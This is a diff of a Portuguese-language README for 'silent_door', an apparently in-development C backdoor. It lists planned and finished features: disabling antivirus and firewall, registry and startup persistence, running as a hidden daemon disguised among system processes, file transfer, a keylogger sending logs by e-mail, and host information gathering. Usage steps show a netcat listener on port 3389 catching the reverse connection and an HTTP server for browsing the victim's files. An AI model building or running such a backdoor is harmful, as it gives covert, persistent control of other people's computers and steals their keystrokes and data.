@@ -1,29 +1,34 @@
-# Silent_door.c
+# silent_door
 
 # Clássico backdoor, escrito na linguagem C.
  
 # Em desenvolvimento.
 
-Desenvolpment of a backdoor write in C. 
+Classic backdoor, write in c language.
+
+In desenvolpment.  
 
 # Funções: 
 
-# auto executáveis > executam junto com o programa principal.
+# auto executáveis -> executam-se automaticamente após a instalação
 
-(#) desativar anti-vírus 
+(#) desativar anti-vírus (caso exista) 
 
-(#) desativar firewall 
+(#) desativar firewall (abrir portas, redirecionar etc)
 
 (#) copiar o software para o registro da máquina alvo 
 
-(#) copiar software para inicialização junto aos demais programas 
+(#) copiar o software para inicialização junto aos demais programas, assim tendo a conexão ativa quando a máquina for religada
 
+(#) fork para criar um deamon, para rodar no background 
+
+(#) invisível, ao ser executado nada ocorre e os processos associam-se a processos originais do sistema
+
+#######################################################################################################
 
 # Funções arbitrárias:
 
-# executadas pelo servidor 
-
-(#) fork para criar um deamon > usado em combinação com a reverse shell 
+# executadas pelo servidor (o qual está em desenvolvimento!) 
 
 (#) enviar arquivo para a máquina alvo
 
@@ -31,27 +36,42 @@ Desenvolpment of a backdoor write in C.
 
 ( ) inicializar keylogger em modo passivo, enviando os arquivos para e-mail e/ou direto para o servidor. 
 
-(#) informações sobre: ip, nome da máquina
+ *OBS: Keylogger com tais funções já está pronto. 
+
+(#) informações sobre: ip, nome da máquina etc
 
 ( ) informações sobre: a rede da máquina alvo ( outras máquinas conectadas à mesma rede)
  
-.... mais por vir. 
+.... e muito mais por vir!
 
+######################################################################################################
 
-# ./sdinstall.sh | script to install and compile the source. 
+No arquivo requirements.txt estão as bibliotecas necessárias
 
-# Usage: 
+Caso queira instalar e compilar automaticamente, execute o script sdinstall.sh, contido na pasta install  
+
+# Uso (improvisado): 
 
 1. nc -lvp 3389 
 
-2. run ./main_backdoor (or ./wine.01.2) 
+2. ./silent_door (ou ./wine.01.2 ou outro nome qualquer definido) 
 
-3. you have connection. 
+3. a conexão é estabelecida  
 
-# can be very usefull. 4. python -m SimpleHTTPServer 3389 
+# Pode ser útil (porém não recomendado):
 
-5. In this pont, just use your skills. 
+4. python -m SimpleHTTPServer 3389
 
-Peace, 
+Abrindo o diretório atual, para visualização e download dos arquivos
+
+5. Nesse ponto em diante, use suas habilidades 
+
+Sugiro abrir uma nova conexão no backdoor com netcat
+
+Assim como ler a documentação do netcat: man netcat 
+
+enfim, isso está sendo aprimorado 
+
+Paz, 
 
 mrx6SO
